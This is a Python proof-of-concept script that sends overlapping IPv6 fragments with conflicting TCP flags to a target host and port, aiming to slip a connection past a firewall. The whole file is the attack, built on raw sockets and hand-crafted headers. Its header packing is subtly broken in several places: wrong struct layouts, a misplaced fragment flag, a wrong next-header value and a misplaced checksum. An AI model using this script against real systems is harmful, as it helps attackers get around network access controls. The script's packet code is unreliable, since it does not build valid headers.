#!/usr/bin/env python3
import struct
import socket
import sys
import os

def calculate_checksum(header_bytes):
    """Calculate IPv6 pseudo-header checksum."""
    if len(header_bytes) % 2 != 0:
        header_bytes += b'\x00'
    total = 0
    for i in range(0, len(header_bytes), 2):
        word = (header_bytes[i] << 8) + header_bytes[i+1]
        total += word
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF

def craft_tcp_header(src_port, dst_port, seq, ack, flags, window=65535, payload=b''):
    """Craft a TCP header."""
    data_offset = (5 << 4)  # 5 words = 20 bytes
    header = struct.pack('!HHIIHHH', src_port, dst_port, seq, ack, data_offset, flags, window)
    checksum = 0  # Placeholder, will be calculated later
    urgent_ptr = 0
    header += struct.pack('!HH', checksum, urgent_ptr)
    return header

def craft_ipv6_header(src_ip, dst_ip, payload_len, next_header, hop_limit=64):
    """Craft an IPv6 header."""
    version = 6
    traffic_class = 0
    flow_label = 0
    header = struct.pack('!BBHHHQI', (version << 4) | (traffic_class >> 8), traffic_class & 0xFF, flow_label, payload_len, next_header, hop_limit)
    # Source and Destination IPs are packed as 16 bytes each
    src_bytes = socket.inet_pton(socket.AF_INET6, src_ip)
    dst_bytes = socket.inet_pton(socket.AF_INET6, dst_ip)
    header += src_bytes + dst_bytes
    return header

def craft_fragment_header(next_header, frag_offset, more_fragments, identification):
    """Craft an IPv6 Fragment Extension Header."""
    # Fragment Offset is in 8-byte blocks, so multiply by 8
    frag_offset_bytes = frag_offset * 8
    res_m = (more_fragments << 0) | (0 << 1) | (0 << 2)  # Reserved bits 0, M flag
    header = struct.pack('!BBHI', next_header, 0, frag_offset_bytes, identification)
    header += struct.pack('!B', res_m)
    return header

def craft_destination_options_header(next_header, options):
    """Craft a Destination Options Header."""
    # Hdr Ext Len is (length - 8) / 8
    hdr_ext_len = (len(options) + 8) // 8 - 1
    header = struct.pack('!BB', next_header, hdr_ext_len)
    header += options
    return header

def send_fragment(sock, src_ip, dst_ip, identification, frag_offset, more_fragments, tcp_header, payload, next_header=60):
    """Send an IPv6 fragment."""
    # Calculate total payload length for IPv6 header
    frag_header = craft_fragment_header(next_header, frag_offset, more_fragments, identification)
    total_payload_len = len(frag_header) + len(tcp_header) + len(payload)
    
    # Craft IPv6 header
    ipv6_header = craft_ipv6_header(src_ip, dst_ip, total_payload_len, 44)  # 44 is Fragment Header
    
    # Calculate TCP checksum
    pseudo_header = socket.inet_pton(socket.AF_INET6, src_ip) + socket.inet_pton(socket.AF_INET6, dst_ip) + struct.pack('!HI', total_payload_len, 6)
    tcp_with_payload = tcp_header + payload
    tcp_checksum = calculate_checksum(pseudo_header + tcp_with_payload)
    
    # Update TCP header with correct checksum
    tcp_header = tcp_header[:16] + struct.pack('!H', tcp_checksum) + tcp_header[18:]
    
    # Assemble packet
    packet = ipv6_header + frag_header + tcp_header + payload
    
    # Send packet
    sock.sendto(packet, (dst_ip, 0, 0, 0))
    print(f"Sent fragment: offset={frag_offset}, more={more_fragments}, len={len(packet)}")

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 poc_ipv6_overlapping_fragment_firewall_bypass.py <target_ipv6> <target_port>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    src_ip = "2001:db8::1"  # Example source IP
    identification = 0x12345678
    
    # Create raw socket
    sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_HDRINCL, 1)
    
    # Step 1: Craft first fragment with SYN+ACK flags
    tcp_header_1 = craft_tcp_header(12345, target_port, 1000, 2000, 0x0012)  # SYN=1, ACK=1
    payload_1 = b'A' * 100  # Some payload to make it large enough to fragment
    
    # Step 2: Craft second fragment with SYN flag only, overlapping with first fragment
    tcp_header_2 = craft_tcp_header(12345, target_port, 1000, 0, 0x0002)  # SYN=1, ACK=0
    payload_2 = b'B' * 100  # Overlapping payload
    
    # Send first fragment
    send_fragment(sock, src_ip, target_ip, identification, 0, 1, tcp_header_1, payload_1)
    
    # Send second fragment with overlap
    send_fragment(sock, src_ip, target_ip, identification, 10, 0, tcp_header_2, payload_2)
    
    print("Fragments sent. Check if the firewall allowed the connection.")
    sock.close()

if __name__ == "__main__":
    main()
